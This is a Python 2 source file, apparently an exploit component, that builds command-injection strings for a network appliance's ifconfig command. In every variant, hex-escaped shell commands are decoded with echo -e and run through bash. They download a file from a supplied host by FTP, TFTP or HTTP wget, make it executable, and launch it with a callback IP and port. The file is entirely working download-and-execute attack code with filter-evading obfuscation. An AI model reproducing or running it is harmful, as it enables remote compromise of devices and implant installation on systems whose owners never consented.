import string


# mangle the special chars
def mangle(cmd):
    cmd = string.replace(cmd, ";", '\\\\x3b')
    cmd = string.replace(cmd, ">", '\\\\x3e')
    cmd = string.replace(cmd, "|", '\\\\x7c')

    return(cmd)    


def prepare_command_ftp(params):
    # build shell command sequence first
    # semi and space at end of each
    shell_command = ''
    shell_command += 'echo default login %s password %s macdef init > /tmp/.netrc; ' % (params.dl_user, params.dl_pass)
    shell_command += 'echo binary >> /tmp/.netrc; '
    shell_command += 'echo get %s /tmp/%s >> /tmp/.netrc; ' % (params.dl_file, params.dl_file)
    shell_command += 'echo quit >> /tmp/.netrc; '
    shell_command += 'echo >> /tmp/.netrc; '
    shell_command += 'echo >> /tmp/.netrc; '
    shell_command += 'chmod 600 /tmp/.netrc; '
    shell_command += 'HOME=/tmp ftp %s %d > /dev/null; ' % (params.dl_ip, params.dl_port)
    shell_command += 'rm -f /tmp/.netrc; '
    shell_command += 'chmod 777 /tmp/%s; ' % params.dl_file
    shell_command += 'D=-c%s:%s /tmp/%s; ' % (params.callback_ip, params.callback_port, params.dl_file)
    shell_command += 'echo eth0; '

    if params.debug:
        print "created shell_command:"
        print shell_command

    # pre-mangle magic chars
    shell_command = mangle(shell_command)

    # wrap that in the unescaper to that undoes our mangling above
    esc_command = 'echo -e \'%s\'' % shell_command

    if params.debug:
        print "created esc_command:"
        print esc_command

    # now wrap into the shell exec fun
    cli_command = 'ifconfig \"$(bash -c \\\"$(%s)\\\")\"' % esc_command

    if params.debug:
        print "created cli_command:"
        print cli_command

    return(cli_command)


def prepare_command_tftp(params):
    # build shell command sequence first
    # semi and space at end of each
    shell_command = ''
    shell_command += '| /usr/rapidstream/bin/tftp %s > /dev/null; ' % params.dl_ip
    shell_command += 'chmod 777 /tmp/%s; ' % params.dl_file
    shell_command += 'D=-c%s:%s /tmp/%s; ' % (params.callback_ip, params.callback_port, params.dl_file)
    shell_command += 'echo eth0; '

    if params.debug:
        print "created shell_command:"
        print shell_command

    # pre-mangle magic chars
    shell_command = mangle(shell_command)

    # wrap that in the unescaper to that undoes our mangling above
    esc_command = 'echo -e \'%s\'' % shell_command

    if params.debug:
        print "created esc_command:"
        print esc_command

    # now wrap into the shell exec fun
    cli_command = 'ifconfig \"$(bash -c \\\"echo \'mode binary\\nget %s\'$(%s)\\\")\"' % (params.dl_file, esc_command)

    if params.debug:
        print "created cli_command:"
        print cli_command

    return(cli_command)


def prepare_command_http(params):
    # build shell command sequence first
    # semi and space at end of each
    shell_command = ''
    shell_command += '/usr/bin/wget http://%s:%s/%s ' % (params.dl_ip, params.dl_port, params.dl_file)
    shell_command += '-O /tmp/%s > /dev/null; ' % params.dl_file
    shell_command += 'chmod 777 /tmp/%s; ' % params.dl_file
    shell_command += 'D=-c%s:%s /tmp/%s; ' % (params.callback_ip, params.callback_port, params.dl_file)
    shell_command += 'echo eth0; '

    if params.debug:
        print "created shell_command:"
        print shell_command

    # pre-mangle magic chars
    shell_command = mangle(shell_command)

    # wrap that in the unescaper to that undoes our mangling above
    esc_command = 'echo -e \'%s\'' % shell_command

    if params.debug:
        print "created esc_command:"
        print esc_command

    # now wrap into the shell exec fun
    cli_command = 'ifconfig \"$(bash -c \\\"$(%s)\\\")\"' % esc_command

    if params.debug:
        print "created cli_command:"
        print cli_command

    return(cli_command)


def prepare_command(params):
    if params.dl_proto == "ftp":
        return(prepare_command_ftp(params))
    elif params.dl_proto == "tftp":
        return(prepare_command_tftp(params))
    elif params.dl_proto == "http":
        return(prepare_command_http(params))
    else:
        return None
